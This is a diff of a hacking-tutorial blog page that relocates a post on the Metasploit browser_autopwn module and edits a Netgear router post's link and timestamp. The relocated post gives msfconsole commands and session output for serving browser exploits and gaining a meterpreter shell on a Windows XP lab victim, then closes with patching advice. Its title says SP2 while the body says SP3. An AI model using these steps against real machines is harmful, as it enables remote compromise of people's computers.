@@ -14,80 +14,10 @@
 <div id="description">Hacking tutorials + info</div>
 </div></div></div>
 <div id="divbody"><div class="content">
-<h3><a class="ablack" href="metasploit-browser-autopwn---windows-xp-sp2.html">
-Metasploit Browser Autopwn – Windows XP SP2
-</a></h3>
-<!-- bashblog_timestamp: #201606301745.20# -->
-<div class="subtitle">June 30, 2016 &mdash; 
-metalkey
-</div>
-<!-- text begin -->
-<strong>Attacker:</strong> Kali Linux<br>
-<strong>Victim:</strong> Windows XP SP3 (Java 6u25, IE6)<br>
-<br></p>
-
-<h2>Step 1 – Starting the Browser Autopwn Server</h2>
-
-<p>Run msfconsole, load the browser_autopwn module and set all required options.<br>
-<code></p>
-
-<div style="background-color: black; color: white; padding: 20px;">
-<font color="silver">root@kali:~$</font> <b>msfconsole</b><br>
-<font color="silver">msf ></font> <b>use auxiliary/server/browser_autopwn</b><br>
-<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set LHOST 192.168.1.12</b><br>
-<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set SRVPORT 80</b><br>
-<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set URIPATH /</b><br>
-<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>run</b><br>
-<br>
-<font color="silver">[*] Starting exploit modules on host 192.168.1.12...</font><br>
-<font color="silver">[*] Server started.</font>
-</div>
-
-<p></code>
-The Browser Autopwn Server is now running and waiting for victims to browse to the url http://192.168.1.12<br></p>
-
-<h2>Step 2 – Pwning the Victim</h2>
-
-<p>On your Windows XP test machine (victim), browse to http://192.168.1.12.<br>
-This will trigger the browser_autopwn module to serve the appropriate exploit and launch a meterpreter session.<br>
-<code></p>
-
-<div style="background-color: black; color: white; padding: 20px;">
-<font color="silver">[*] Meterpreter session 1 opened (192.168.1.12:7777 -> </font><br>
-<font color="silver">192.168.1.13:1045) at 2015-07-25 05:08:06 -0400</font><br>
-<font color="silver">...</font><br>
-<font color="silver">msf auxiliary(browser_autopwn) ></font><b> sessions -i 1</b><br>
-<font color="silver">[*] Starting interaction with 1...meterpreter ></font><b> shell</b><br>
-<font color="silver">Microsoft Windows XP [Version 5.1.2600]</font><br>
-<font color="silver">(C) Copyright 1985-2001 Microsoft Corp.C:\Documents and Settings\IEUser\Desktop></font><b>echo %USERNAME%</b><br>
-<font color="silver">Victim</font><br>
-<br>
-<font color="silver">C:\Documents and Settings\IEUser\Desktop></font><b>ipconfig</b><br>
-<font color="silver">Windows IP Configuration</font><br>
-<br>
-<font color="silver">Ethernet adapter Local Area Connection:</font><br>
-<br>
-<font color="silver">Connection-specific DNS Suffix . : Home</font><br>
-<font color="silver">IP Address. . . . . . . . . . . . : 192.168.1.13</font><br>
-<font color="silver">Subnet Mask . . . . . . . . . . . : 255.255.255.0</font><br>
-<font color="silver">Default Gateway . . . . . . . . . : 192.168.1.1</font><br>
-<br>
-<font color="silver">C:\Documents and Settings\IEUser\Desktop></font><br>
-</div>
-
-<p></code>
-You now have shell access to the Windows XP SP3 Victim with the same access as the user who navigated to the exploit url.<br></p>
-
-<h2>Solution</h2>
-
-<p>Keep your software fully updated (e.g. Windows, Web Browsers, Java, etc…) and uninstall unused applications.</p>
-
-<p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
-<!-- text end -->
-<h3><a class="ablack" href="netgear-wireless-router-default-passphrase-vulnerability16025.html">
+<h3><a class="ablack" href="netgear-wireless-router-default-passphrase-vulnerability1498.html">
 Netgear Wireless Router Default Passphrase Vulnerability
 </a></h3>
-<!-- bashblog_timestamp: #201606301745.11# -->
+<!-- bashblog_timestamp: #201606301754.26# -->
 <div class="subtitle">June 30, 2016 &mdash; 
 metalkey
 </div>
@@ -157,6 +87,77 @@ Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=
 <p>Never use the default passphrase provided with your router and always use complex passwords that do not follow predictable patterns.</p>
 
 <p>Tags: <a href='tag_wifi.html'>wifi</a></p>
+<!-- text end -->
+<h3><a class="ablack" href="metasploit-browser-autopwn---windows-xp-sp2.html">
+Metasploit Browser Autopwn – Windows XP SP2
+</a></h3>
+<!-- bashblog_timestamp: #201606301745.20# -->
+<div class="subtitle">June 30, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+<strong>Attacker:</strong> Kali Linux<br>
+<strong>Victim:</strong> Windows XP SP3 (Java 6u25, IE6)<br>
+<br></p>
+
+<h2>Step 1 – Starting the Browser Autopwn Server</h2>
+
+<p>Run msfconsole, load the browser_autopwn module and set all required options.<br>
+<code></p>
+
+<div style="background-color: black; color: white; padding: 20px;">
+<font color="silver">root@kali:~$</font> <b>msfconsole</b><br>
+<font color="silver">msf ></font> <b>use auxiliary/server/browser_autopwn</b><br>
+<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set LHOST 192.168.1.12</b><br>
+<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set SRVPORT 80</b><br>
+<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>set URIPATH /</b><br>
+<font color="silver">msf auxiliary(browser_autopwn) ></font> <b>run</b><br>
+<br>
+<font color="silver">[*] Starting exploit modules on host 192.168.1.12...</font><br>
+<font color="silver">[*] Server started.</font>
+</div>
+
+<p></code>
+The Browser Autopwn Server is now running and waiting for victims to browse to the url http://192.168.1.12<br></p>
+
+<h2>Step 2 – Pwning the Victim</h2>
+
+<p>On your Windows XP test machine (victim), browse to http://192.168.1.12.<br>
+This will trigger the browser_autopwn module to serve the appropriate exploit and launch a meterpreter session.<br>
+<code></p>
+
+<div style="background-color: black; color: white; padding: 20px;">
+<font color="silver">[*] Meterpreter session 1 opened (192.168.1.12:7777 -> </font><br>
+<font color="silver">192.168.1.13:1045) at 2015-07-25 05:08:06 -0400</font><br>
+<font color="silver">...</font><br>
+<font color="silver">msf auxiliary(browser_autopwn) ></font><b> sessions -i 1</b><br>
+<font color="silver">[*] Starting interaction with 1...meterpreter ></font><b> shell</b><br>
+<font color="silver">Microsoft Windows XP [Version 5.1.2600]</font><br>
+<font color="silver">(C) Copyright 1985-2001 Microsoft Corp.C:\Documents and Settings\IEUser\Desktop></font><b>echo %USERNAME%</b><br>
+<font color="silver">Victim</font><br>
+<br>
+<font color="silver">C:\Documents and Settings\IEUser\Desktop></font><b>ipconfig</b><br>
+<font color="silver">Windows IP Configuration</font><br>
+<br>
+<font color="silver">Ethernet adapter Local Area Connection:</font><br>
+<br>
+<font color="silver">Connection-specific DNS Suffix . : Home</font><br>
+<font color="silver">IP Address. . . . . . . . . . . . : 192.168.1.13</font><br>
+<font color="silver">Subnet Mask . . . . . . . . . . . : 255.255.255.0</font><br>
+<font color="silver">Default Gateway . . . . . . . . . : 192.168.1.1</font><br>
+<br>
+<font color="silver">C:\Documents and Settings\IEUser\Desktop></font><br>
+</div>
+
+<p></code>
+You now have shell access to the Windows XP SP3 Victim with the same access as the user who navigated to the exploit url.<br></p>
+
+<h2>Solution</h2>
+
+<p>Keep your software fully updated (e.g. Windows, Web Browsers, Java, etc…) and uninstall unused applications.</p>
+
+<p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
+
 <!-- text end -->
 <div id="all_posts"><a href="all_posts.html">View more posts</a> &mdash; <a href="all_tags.html">All tags</a> &mdash; <a href="feed.rss">Subscribe</a></div>
 </div>
